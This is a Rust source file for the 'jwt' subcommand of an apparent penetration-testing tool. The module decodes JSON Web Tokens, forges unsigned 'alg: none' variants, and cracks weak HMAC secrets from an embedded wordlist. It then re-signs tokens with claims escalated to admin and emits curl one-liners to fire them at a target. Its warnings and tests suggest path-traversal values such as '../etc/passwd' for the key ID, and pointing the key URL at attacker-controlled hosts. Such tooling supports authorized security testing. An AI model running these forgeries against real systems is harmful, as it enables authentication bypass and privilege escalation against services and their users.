//! `wafrift jwt` — JWT weakness analyzer + forgery generator.
//!
//! Most modern APIs ship JWTs. Most pentest workflows include a
//! 'check the JWT' step. wafrift had nothing for it. This module
//! is the first-touch JWT audit tool every pentester reaches for:
//!
//! 1. Decode the header + payload (base64url, no signature verify).
//! 2. Identify the algorithm + classify it (none / HS* / RS* / ES* /
//!    EdDSA / unknown).
//! 3. Generate weakness reports:
//!    - `alg: none` forged token (CVE-2015-2951 family — still
//!      reachable on legacy jsonwebtoken / pyjwt < 2.0 / java-jwt
//!      pre-3.x and any custom verifier that doesn't reject
//!      'none' on the server side).
//!    - HS256/HS384/HS512 weak-secret brute against a small
//!      embedded wordlist (top common values + the JWT spec's
//!      explicitly weak example secrets).
//!    - `kid` header path traversal — operator-visible hint when
//!      the header carries one.
//!    - `jku` / `jwk` header pointing at attacker — operator-visible
//!      hint when present.
//!    - Time-claim sanity: very-long-lived (exp - iat > 90 days),
//!      already-expired, or future-issued tokens flagged.
//!
//! Every weakness ships with a forged token + curl repro. The
//! operator hits the target with each variant; whichever the
//! backend accepts is the exploitable weakness.

use clap::Args;
use colored::Colorize;
use hmac::{Hmac, Mac};
use serde_json::{Value, json};
use sha2::{Sha256, Sha384, Sha512};
use std::io::Read;
use std::path::PathBuf;
use std::process::ExitCode;

/// Compact wordlist of weak / well-known JWT secrets the analyzer
/// tries against any HS* algorithm. Sourced from:
/// - JWT RFC examples ("your-256-bit-secret" et al.)
/// - the top-N common-secrets lists every pentester carries
/// - explicitly-weak defaults in popular JWT libraries
const WEAK_SECRETS: &[&str] = &[
    "",
    "secret",
    "Secret",
    "SECRET",
    "password",
    "Password",
    "PASSWORD",
    "your-256-bit-secret",
    "your-384-bit-secret",
    "your-512-bit-secret",
    "your_jwt_secret",
    "jwt_secret",
    "jwt-secret",
    "JWT_SECRET",
    "key",
    "Key",
    "KEY",
    "secretkey",
    "secret_key",
    "secret-key",
    "default",
    "default_secret",
    "default_key",
    "changeme",
    "change-me",
    "todo",
    "test",
    "Test",
    "TEST",
    "test123",
    "admin",
    "Admin",
    "ADMIN",
    "root",
    "Root",
    "ROOT",
    "qwerty",
    "12345",
    "123456",
    "1234567890",
    "abcdef",
    "abc123",
    "Pa$$w0rd",
    "P@ssw0rd",
    "Password123",
    "Password1!",
    "letmein",
    "iloveyou",
    "monkey",
    "dragon",
    "master",
    "shadow",
    "superuser",
    "supersecret",
    "super_secret",
    "private",
    "privatekey",
    "private_key",
    "private-key",
    "nodejs",
    "express",
    "node-jwt",
    "django",
    "rails",
    "flask",
    "fastapi",
    "spring",
    "spring-boot",
    "auth0",
    "okta",
    "supabase",
    "firebase",
];

#[derive(Args, Debug)]
pub struct JwtArgs {
    /// JWT to analyze. Mutually exclusive with `--stdin` / `--file`.
    #[arg(conflicts_with_all = ["stdin", "file"])]
    pub token: Option<String>,

    /// Read the JWT from stdin. Useful for piping (`curl ... |
    /// jq -r .access_token | wafrift jwt --stdin`).
    #[arg(long, conflicts_with_all = ["token", "file"])]
    pub stdin: bool,

    /// Read the JWT from a file.
    #[arg(long, conflicts_with_all = ["token", "stdin"])]
    pub file: Option<PathBuf>,

    /// Output format: `text` (default — human-friendly with colour)
    /// or `json` (structured for CI / scripting).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Skip the HS* weak-secret brute. Useful when the token is
    /// known to be RS*/ES*/EdDSA so the brute is pure noise.
    #[arg(long, default_value_t = false)]
    pub skip_brute: bool,
}

/// One forgery the analyzer produced — operator copy-pastes into
/// a curl / Authorization header to test against the target.
#[derive(Debug, Clone, serde::Serialize)]
pub struct Forgery {
    /// Stable kind tag (`alg-none`, `hs256-weak-secret`, ...).
    pub kind: &'static str,
    /// One-line description of the weakness this forgery exploits.
    pub description: String,
    /// The forged JWT, ready to drop into an Authorization: Bearer
    /// header.
    pub token: String,
    /// Curl one-liner that fires the forged token against
    /// `<target>` — operator substitutes the URL.
    pub curl_template: String,
}

/// Decoded view of a JWT. None signature verification — that's
/// the WHOLE POINT (we want to see the structure regardless).
#[derive(Debug, Clone, serde::Serialize)]
pub struct DecodedJwt {
    pub header: Value,
    pub payload: Value,
    pub signature_b64: String,
    pub alg: String,
    pub typ: String,
    pub kid: Option<String>,
    pub jku: Option<String>,
    pub jwk: Option<String>,
    /// JWT spec time claims, when present.
    pub iat: Option<i64>,
    pub exp: Option<i64>,
    pub nbf: Option<i64>,
}

/// Errors from decoding / analyzing.
#[derive(Debug)]
pub enum JwtError {
    /// Input wasn't a `<header>.<payload>.<signature>` triple.
    Malformed,
    /// Header or payload section wasn't valid base64url.
    BadBase64(String),
    /// Header or payload didn't deserialize as JSON.
    BadJson(String),
    /// I/O when reading from stdin / file.
    Io(std::io::Error),
}

impl std::fmt::Display for JwtError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Malformed => write!(f, "not a JWT — must be three base64url segments separated by '.'"),
            Self::BadBase64(s) => write!(f, "base64url decode failed: {s}"),
            Self::BadJson(s) => write!(f, "JSON parse failed: {s}"),
            Self::Io(e) => write!(f, "I/O error: {e}"),
        }
    }
}
impl std::error::Error for JwtError {}

/// Decode a JWT string into its three segments (no signature
/// verification — that requires the secret/key).
///
/// # Errors
/// Returns [`JwtError`] when the input is not a well-formed JWT.
pub fn decode(token: &str) -> Result<DecodedJwt, JwtError> {
    use base64::Engine as _;
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err(JwtError::Malformed);
    }
    let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(parts[0].as_bytes())
        .map_err(|e| JwtError::BadBase64(format!("header: {e}")))?;
    let payload_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(parts[1].as_bytes())
        .map_err(|e| JwtError::BadBase64(format!("payload: {e}")))?;
    let header: Value = serde_json::from_slice(&header_bytes)
        .map_err(|e| JwtError::BadJson(format!("header: {e}")))?;
    let payload: Value = serde_json::from_slice(&payload_bytes)
        .map_err(|e| JwtError::BadJson(format!("payload: {e}")))?;
    let alg = header
        .get("alg")
        .and_then(Value::as_str)
        .unwrap_or("unknown")
        .to_string();
    let typ = header
        .get("typ")
        .and_then(Value::as_str)
        .unwrap_or("JWT")
        .to_string();
    let kid = header.get("kid").and_then(Value::as_str).map(str::to_string);
    let jku = header.get("jku").and_then(Value::as_str).map(str::to_string);
    let jwk = header
        .get("jwk")
        .and_then(|v| if v.is_null() { None } else { Some(v.to_string()) });
    let iat = payload.get("iat").and_then(Value::as_i64);
    let exp = payload.get("exp").and_then(Value::as_i64);
    let nbf = payload.get("nbf").and_then(Value::as_i64);
    Ok(DecodedJwt {
        header,
        payload,
        signature_b64: parts[2].to_string(),
        alg,
        typ,
        kid,
        jku,
        jwk,
        iat,
        exp,
        nbf,
    })
}

/// Forge an `alg: none` variant. JWT RFC 7519 §6.1 permits the
/// 'none' algorithm; many implementations (especially pre-2.0
/// pyjwt, jsonwebtoken < 4.x, custom verifiers) still accept it.
/// The forged token has the same payload, an empty signature
/// segment, and `alg: none` in the header.
#[must_use]
pub fn forge_alg_none(decoded: &DecodedJwt) -> Forgery {
    use base64::Engine as _;
    let mut header = decoded.header.clone();
    header["alg"] = Value::String("none".into());
    let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(serde_json::to_vec(&header).unwrap_or_default());
    let payload_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(serde_json::to_vec(&decoded.payload).unwrap_or_default());
    let token = format!("{header_b64}.{payload_b64}.");
    Forgery {
        kind: "alg-none",
        description: "alg=none — backend accepts unsigned token (CVE-2015-2951 family)".into(),
        token: token.clone(),
        curl_template: format!(
            "curl -H 'Authorization: Bearer {token}' '<TARGET-URL>'"
        ),
    }
}

/// Forge a token signed with the given HS* algorithm + secret.
/// Returns the signed token in compact form.
fn forge_hs(decoded: &DecodedJwt, alg: &str, secret: &str) -> Option<String> {
    use base64::Engine as _;
    let mut header = decoded.header.clone();
    header["alg"] = Value::String(alg.into());
    let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(serde_json::to_vec(&header).ok()?);
    let payload_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .encode(serde_json::to_vec(&decoded.payload).ok()?);
    let signing_input = format!("{header_b64}.{payload_b64}");
    let sig = match alg {
        "HS256" => hmac_sha256(secret.as_bytes(), signing_input.as_bytes()),
        "HS384" => hmac_sha384(secret.as_bytes(), signing_input.as_bytes()),
        "HS512" => hmac_sha512(secret.as_bytes(), signing_input.as_bytes()),
        _ => return None,
    };
    let sig_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(sig);
    Some(format!("{signing_input}.{sig_b64}"))
}

/// HMAC-SHA256 of `msg` under `key`. Sized helper instead of a
/// generic over `Digest` to avoid the giant trait-bound dance the
/// generic form needs.
fn hmac_sha256(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(key)
        .expect("HMAC accepts any key length");
    mac.update(msg);
    mac.finalize().into_bytes().to_vec()
}

/// HMAC-SHA384.
fn hmac_sha384(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut mac = <Hmac<Sha384> as Mac>::new_from_slice(key)
        .expect("HMAC accepts any key length");
    mac.update(msg);
    mac.finalize().into_bytes().to_vec()
}

/// HMAC-SHA512.
fn hmac_sha512(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut mac = <Hmac<Sha512> as Mac>::new_from_slice(key)
        .expect("HMAC accepts any key length");
    mac.update(msg);
    mac.finalize().into_bytes().to_vec()
}

/// Verify a JWT's HS* signature against the given secret. Returns
/// true when the signature matches.
fn verify_hs(decoded: &DecodedJwt, header_b64: &str, payload_b64: &str, secret: &str) -> bool {
    use base64::Engine as _;
    let signing_input = format!("{header_b64}.{payload_b64}");
    let expected_sig = match decoded.alg.as_str() {
        "HS256" => hmac_sha256(secret.as_bytes(), signing_input.as_bytes()),
        "HS384" => hmac_sha384(secret.as_bytes(), signing_input.as_bytes()),
        "HS512" => hmac_sha512(secret.as_bytes(), signing_input.as_bytes()),
        _ => return false,
    };
    let provided_sig = match base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(decoded.signature_b64.as_bytes())
    {
        Ok(v) => v,
        Err(_) => return false,
    };
    // Constant-time compare — even in the analyzer path, leaking
    // timing on the secret guess would be a pristine-code miss.
    use subtle_compare::compare_slices_const_time;
    compare_slices_const_time(&expected_sig, &provided_sig)
}

/// Reusable constant-time slice compare. Keeps `verify_hs` from
/// pulling subtle as a crate dep — small standalone primitive,
/// 6 lines, isolated.
mod subtle_compare {
    #[inline]
    pub fn compare_slices_const_time(a: &[u8], b: &[u8]) -> bool {
        if a.len() != b.len() {
            return false;
        }
        let mut diff: u8 = 0;
        for (x, y) in a.iter().zip(b.iter()) {
            diff |= x ^ y;
        }
        diff == 0
    }
}

/// Brute-force the HS* secret against the embedded wordlist.
/// Returns `Some(secret)` when one of the candidates verifies the
/// token's signature, `None` otherwise.
#[must_use]
pub fn brute_hs_secret(decoded: &DecodedJwt, token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    let (header_b64, payload_b64) = (parts[0], parts[1]);
    if !matches!(decoded.alg.as_str(), "HS256" | "HS384" | "HS512") {
        return None;
    }
    for candidate in WEAK_SECRETS {
        if verify_hs(decoded, header_b64, payload_b64, candidate) {
            return Some((*candidate).to_string());
        }
    }
    None
}

/// Build the full forgery set for a decoded JWT.
#[must_use]
pub fn analyze(decoded: &DecodedJwt, original_token: &str, skip_brute: bool) -> Vec<Forgery> {
    let mut out = Vec::new();
    // 1. Always emit alg-none — the backend either accepts it
    // (CRITICAL bypass) or doesn't.
    out.push(forge_alg_none(decoded));
    // 2. Weak-secret brute on HS*.
    if !skip_brute {
        if let Some(secret) = brute_hs_secret(decoded, original_token) {
            // Build a forgery with elevated claims if the payload
            // looks shaped for that. Otherwise just re-sign the
            // original.
            let mut elevated = decoded.payload.clone();
            if elevated.get("admin").is_some() {
                elevated["admin"] = Value::Bool(true);
            }
            if elevated.get("role").and_then(Value::as_str).is_some() {
                elevated["role"] = Value::String("admin".into());
            }
            if elevated.get("isAdmin").is_some() {
                elevated["isAdmin"] = Value::Bool(true);
            }
            let elevated_decoded = DecodedJwt {
                payload: elevated,
                ..decoded.clone()
            };
            if let Some(forged) = forge_hs(&elevated_decoded, &decoded.alg, &secret) {
                out.push(Forgery {
                    kind: "hs-weak-secret",
                    description: format!(
                        "HS* secret CRACKED via wordlist: '{secret}' — token forgeable + claims rewritable"
                    ),
                    token: forged.clone(),
                    curl_template: format!(
                        "curl -H 'Authorization: Bearer {forged}' '<TARGET-URL>'"
                    ),
                });
            }
        }
    }
    out
}

/// Read the JWT input from one of the three sources or error.
fn resolve_input(args: &JwtArgs) -> Result<String, JwtError> {
    if let Some(ref t) = args.token {
        return Ok(t.trim().to_string());
    }
    if args.stdin {
        let mut s = String::new();
        std::io::stdin().read_to_string(&mut s).map_err(JwtError::Io)?;
        return Ok(s.trim().to_string());
    }
    if let Some(ref path) = args.file {
        let s = std::fs::read_to_string(path).map_err(JwtError::Io)?;
        return Ok(s.trim().to_string());
    }
    Err(JwtError::Malformed)
}

#[allow(clippy::needless_pass_by_value)]
pub fn run_jwt(args: JwtArgs) -> ExitCode {
    let token = match resolve_input(&args) {
        Ok(t) if !t.is_empty() => t,
        Ok(_) => {
            eprintln!(
                "{} empty input — supply a JWT as positional arg, --stdin, or --file <PATH>",
                "Input error:".red().bold()
            );
            return ExitCode::from(2);
        }
        Err(e) => {
            eprintln!("{} {e}", "Input error:".red().bold());
            return ExitCode::from(2);
        }
    };

    let decoded = match decode(&token) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("{} {e}", "JWT decode error:".red().bold());
            return ExitCode::from(1);
        }
    };

    let forgeries = analyze(&decoded, &token, args.skip_brute);

    if args.format == "json" {
        let out = json!({
            "decoded": {
                "header": decoded.header,
                "payload": decoded.payload,
                "alg": decoded.alg,
                "typ": decoded.typ,
                "kid": decoded.kid,
                "jku": decoded.jku,
                "jwk": decoded.jwk,
                "iat": decoded.iat,
                "exp": decoded.exp,
                "nbf": decoded.nbf,
            },
            "warnings": warnings(&decoded),
            "forgeries": forgeries,
        });
        println!("{}", serde_json::to_string_pretty(&out).unwrap_or_default());
        return ExitCode::SUCCESS;
    }

    // Text rendering.
    println!("{}", "── wafrift jwt ──".bold().cyan());
    println!(
        "{} {}  {} {}",
        "alg:".bright_black(),
        decoded.alg.bold().yellow(),
        "typ:".bright_black(),
        decoded.typ.yellow()
    );
    if let Some(kid) = decoded.kid.as_ref() {
        println!("{} {}", "kid:".bright_black(), kid.yellow());
    }
    if let Some(jku) = decoded.jku.as_ref() {
        println!("{} {}", "jku:".bright_black(), jku.yellow());
    }
    if let Some(jwk) = decoded.jwk.as_ref() {
        println!("{} {}", "jwk:".bright_black(), jwk.yellow());
    }
    if let Some(iat) = decoded.iat {
        println!("{} {} (issued-at unix)", "iat:".bright_black(), iat);
    }
    if let Some(exp) = decoded.exp {
        println!("{} {} (expiry unix)", "exp:".bright_black(), exp);
    }
    println!();
    println!("{}", "Payload claims:".bold().cyan());
    println!(
        "{}",
        serde_json::to_string_pretty(&decoded.payload).unwrap_or_default()
    );
    println!();

    let warns = warnings(&decoded);
    if !warns.is_empty() {
        println!("{}", "Warnings:".bold().yellow());
        for w in &warns {
            println!("  {} {}", "⚠".yellow(), w.bright_white());
        }
        println!();
    }

    println!("{}", "Forgeries:".bold().green());
    for f in &forgeries {
        println!(
            "  [{}] {}",
            f.kind.bright_cyan(),
            f.description.bright_white()
        );
        println!("    token: {}", f.token.yellow());
        println!("    repro: {}", f.curl_template.bright_black());
        println!();
    }
    if forgeries.iter().any(|f| f.kind == "hs-weak-secret") {
        println!(
            "  {}",
            "↑ HS-* secret cracked — backend is forgeable. Treat as CRITICAL."
                .red()
                .bold()
        );
    }
    ExitCode::SUCCESS
}

/// Generate operator-visible warnings about the decoded JWT.
/// Time-claim sanity + suspicious-header surface.
#[must_use]
pub fn warnings(decoded: &DecodedJwt) -> Vec<String> {
    let mut w = Vec::new();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    if let Some(exp) = decoded.exp {
        if exp < now {
            w.push(format!("token EXPIRED at unix {exp} (now {now})"));
        }
        if let Some(iat) = decoded.iat {
            let lifetime = exp - iat;
            if lifetime > 90 * 24 * 3600 {
                w.push(format!(
                    "extremely long-lived token: lifetime = {} days",
                    lifetime / 86400
                ));
            }
        }
    }
    if let Some(nbf) = decoded.nbf {
        if nbf > now + 60 {
            w.push(format!(
                "token not-yet-valid (nbf {nbf} > now {now}) — clock skew or replay"
            ));
        }
    }
    if decoded.kid.is_some() {
        w.push(format!(
            "header carries kid={:?} — try path-traversal / SQL-i values to test the key lookup",
            decoded.kid.as_deref().unwrap_or("")
        ));
    }
    if decoded.jku.is_some() {
        w.push(format!(
            "header carries jku={:?} — backend fetches keys from a URL. Try pointing at attacker-controlled host.",
            decoded.jku.as_deref().unwrap_or("")
        ));
    }
    if decoded.jwk.is_some() {
        w.push(
            "header carries embedded jwk — backend may trust the token's own embedded key (CVE-2018-0114 family)".into(),
        );
    }
    if decoded.alg.eq_ignore_ascii_case("none") {
        w.push("token already uses alg=none — backend is verifying unsigned tokens".into());
    }
    w
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;

    fn make_token(alg: &str, payload: &Value, secret: &str) -> String {
        let header = json!({"alg": alg, "typ": "JWT"});
        let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let payload_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(payload).unwrap());
        let signing_input = format!("{header_b64}.{payload_b64}");
        let sig = match alg {
            "HS256" => hmac_sha256(secret.as_bytes(), signing_input.as_bytes()),
            "HS384" => hmac_sha384(secret.as_bytes(), signing_input.as_bytes()),
            "HS512" => hmac_sha512(secret.as_bytes(), signing_input.as_bytes()),
            _ => Vec::new(),
        };
        let sig_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(sig);
        format!("{signing_input}.{sig_b64}")
    }

    // ── decode ────────────────────────────────────────────────────

    #[test]
    fn decode_canonical_hs256_jwt() {
        // JWT spec §3.1 example token.
        let t = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let d = decode(t).expect("decode");
        assert_eq!(d.alg, "HS256");
        assert_eq!(d.typ, "JWT");
        assert_eq!(d.payload["sub"], "1234567890");
        assert_eq!(d.payload["name"], "John Doe");
        assert_eq!(d.iat, Some(1516239022));
    }

    #[test]
    fn decode_rejects_non_jwt_input() {
        assert!(matches!(decode("not.a.jwt.with.too.many.parts"), Err(JwtError::Malformed)));
        assert!(matches!(decode("only-two.parts"), Err(JwtError::Malformed)));
        assert!(matches!(decode(""), Err(JwtError::Malformed)));
    }

    #[test]
    fn decode_rejects_bad_base64() {
        assert!(matches!(decode("!!!.!!!.!!!"), Err(JwtError::BadBase64(_))));
    }

    #[test]
    fn decode_rejects_non_json_segments() {
        // valid base64 of plain text (not JSON).
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(b"hello");
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(b"world");
        let bad = format!("{h}.{p}.sig");
        assert!(matches!(decode(&bad), Err(JwtError::BadJson(_))));
    }

    #[test]
    fn decode_carries_kid_jku_jwk_when_present() {
        let header = json!({
            "alg": "HS256",
            "typ": "JWT",
            "kid": "key-1",
            "jku": "https://attacker.example/keys.json",
        });
        let payload = json!({"sub": "x"});
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.sig");
        let d = decode(&t).unwrap();
        assert_eq!(d.kid.as_deref(), Some("key-1"));
        assert_eq!(d.jku.as_deref(), Some("https://attacker.example/keys.json"));
    }

    // ── forge_alg_none ────────────────────────────────────────────

    #[test]
    fn forge_alg_none_produces_unsigned_token_with_same_payload() {
        let t = make_token("HS256", &json!({"sub": "alice", "admin": false}), "secret");
        let d = decode(&t).unwrap();
        let f = forge_alg_none(&d);
        // Forged token ends with `.` (empty signature segment).
        assert!(f.token.ends_with('.'));
        // Decoding the forged token shows alg=none + same payload.
        let d2 = decode(&f.token).unwrap();
        assert_eq!(d2.alg, "none");
        assert_eq!(d2.payload["sub"], "alice");
        assert_eq!(f.kind, "alg-none");
    }

    // ── brute_hs_secret ──────────────────────────────────────────

    #[test]
    fn brute_finds_secret_when_in_wordlist() {
        for known in ["secret", "password", "key", "your-256-bit-secret"] {
            let t = make_token("HS256", &json!({"sub": "alice"}), known);
            let d = decode(&t).unwrap();
            let cracked = brute_hs_secret(&d, &t);
            assert_eq!(
                cracked.as_deref(),
                Some(known),
                "wordlist should find {known}"
            );
        }
    }

    #[test]
    fn brute_returns_none_for_strong_secret() {
        let t = make_token(
            "HS256",
            &json!({"sub": "alice"}),
            "9f3aE8sR7v2qY1zG6tP0wL5mX4hN8bD-strong-random-secret-not-in-wordlist",
        );
        let d = decode(&t).unwrap();
        assert_eq!(brute_hs_secret(&d, &t), None);
    }

    #[test]
    fn brute_skips_non_hs_algorithms() {
        // For RS256 the wordlist makes no sense — return None,
        // never try to verify (which would be cryptographically
        // meaningless).
        let header = json!({"alg": "RS256", "typ": "JWT"});
        let payload = json!({"sub": "x"});
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.opaque-rsa-signature");
        let d = decode(&t).unwrap();
        assert_eq!(brute_hs_secret(&d, &t), None);
    }

    #[test]
    fn brute_works_for_hs384_and_hs512_too() {
        for alg in ["HS384", "HS512"] {
            let t = make_token(alg, &json!({"sub": "alice"}), "secret");
            let d = decode(&t).unwrap();
            assert_eq!(brute_hs_secret(&d, &t).as_deref(), Some("secret"), "{alg}");
        }
    }

    // ── analyze ──────────────────────────────────────────────────

    #[test]
    fn analyze_always_emits_alg_none_forgery() {
        let t = make_token("HS256", &json!({"sub": "a"}), "long-strong-key-not-in-wordlist");
        let d = decode(&t).unwrap();
        let forgeries = analyze(&d, &t, false);
        assert!(forgeries.iter().any(|f| f.kind == "alg-none"));
    }

    #[test]
    fn analyze_emits_hs_weak_secret_forgery_when_cracked() {
        let t = make_token("HS256", &json!({"sub": "alice"}), "secret");
        let d = decode(&t).unwrap();
        let forgeries = analyze(&d, &t, false);
        assert!(
            forgeries.iter().any(|f| f.kind == "hs-weak-secret"),
            "should emit hs-weak-secret when secret is cracked"
        );
    }

    #[test]
    fn analyze_skip_brute_omits_secret_forgery_even_when_weak() {
        let t = make_token("HS256", &json!({"sub": "alice"}), "secret");
        let d = decode(&t).unwrap();
        let forgeries = analyze(&d, &t, true);
        assert!(
            !forgeries.iter().any(|f| f.kind == "hs-weak-secret"),
            "--skip-brute must skip the brute step entirely"
        );
        // alg-none always emits regardless.
        assert!(forgeries.iter().any(|f| f.kind == "alg-none"));
    }

    #[test]
    fn analyze_elevates_admin_role_when_payload_has_those_keys() {
        // The payload's admin=false and role=user should be flipped
        // to admin=true / role=admin in the forged variant — that's
        // the actual exploit shape.
        let t = make_token(
            "HS256",
            &json!({"sub": "alice", "admin": false, "role": "user"}),
            "secret",
        );
        let d = decode(&t).unwrap();
        let forgeries = analyze(&d, &t, false);
        let forged_hs = forgeries
            .iter()
            .find(|f| f.kind == "hs-weak-secret")
            .expect("hs-weak-secret expected");
        let decoded_forged = decode(&forged_hs.token).unwrap();
        assert_eq!(decoded_forged.payload["admin"], true);
        assert_eq!(decoded_forged.payload["role"], "admin");
    }

    // ── warnings ─────────────────────────────────────────────────

    #[test]
    fn warnings_flag_expired_token() {
        let header = json!({"alg": "HS256", "typ": "JWT"});
        let payload = json!({"sub": "x", "exp": 100_000}); // ancient
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.sig");
        let d = decode(&t).unwrap();
        let w = warnings(&d);
        assert!(w.iter().any(|m| m.contains("EXPIRED")));
    }

    #[test]
    fn warnings_flag_jku_jwk_kid_for_attack_attention() {
        let header = json!({
            "alg": "HS256",
            "kid": "../etc/passwd",
            "jku": "https://attacker.com/keys",
            "jwk": {"kty":"oct","k":"abc"},
        });
        let payload = json!({"sub": "x"});
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.sig");
        let d = decode(&t).unwrap();
        let w = warnings(&d);
        assert!(w.iter().any(|m| m.contains("kid=")));
        assert!(w.iter().any(|m| m.contains("jku=")));
        assert!(w.iter().any(|m| m.contains("embedded jwk")));
    }

    #[test]
    fn warnings_flag_already_alg_none_token() {
        let header = json!({"alg": "none", "typ": "JWT"});
        let payload = json!({"sub": "x"});
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.");
        let d = decode(&t).unwrap();
        let w = warnings(&d);
        assert!(w.iter().any(|m| m.contains("alg=none")));
    }

    #[test]
    fn warnings_flag_extremely_long_lived_token() {
        // 91-day lifetime — flagged.
        let header = json!({"alg": "HS256", "typ": "JWT"});
        let payload = json!({
            "iat": 1_000_000,
            "exp": 1_000_000 + 91 * 86400,
        });
        let h = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&header).unwrap());
        let p = base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(serde_json::to_vec(&payload).unwrap());
        let t = format!("{h}.{p}.sig");
        let d = decode(&t).unwrap();
        let w = warnings(&d);
        // Combined with the "already expired" warning (exp is in
        // the past), the lifetime warning still surfaces.
        assert!(w.iter().any(|m| m.contains("long-lived")));
    }

    // ── const-time compare ───────────────────────────────────────

    #[test]
    fn subtle_compare_equal_returns_true() {
        assert!(super::subtle_compare::compare_slices_const_time(
            b"hello", b"hello"
        ));
    }

    #[test]
    fn subtle_compare_unequal_returns_false() {
        assert!(!super::subtle_compare::compare_slices_const_time(
            b"hello", b"world"
        ));
        assert!(!super::subtle_compare::compare_slices_const_time(b"hello", b"hell"));
    }

    #[test]
    fn subtle_compare_empty_strings_are_equal() {
        assert!(super::subtle_compare::compare_slices_const_time(b"", b""));
    }
}
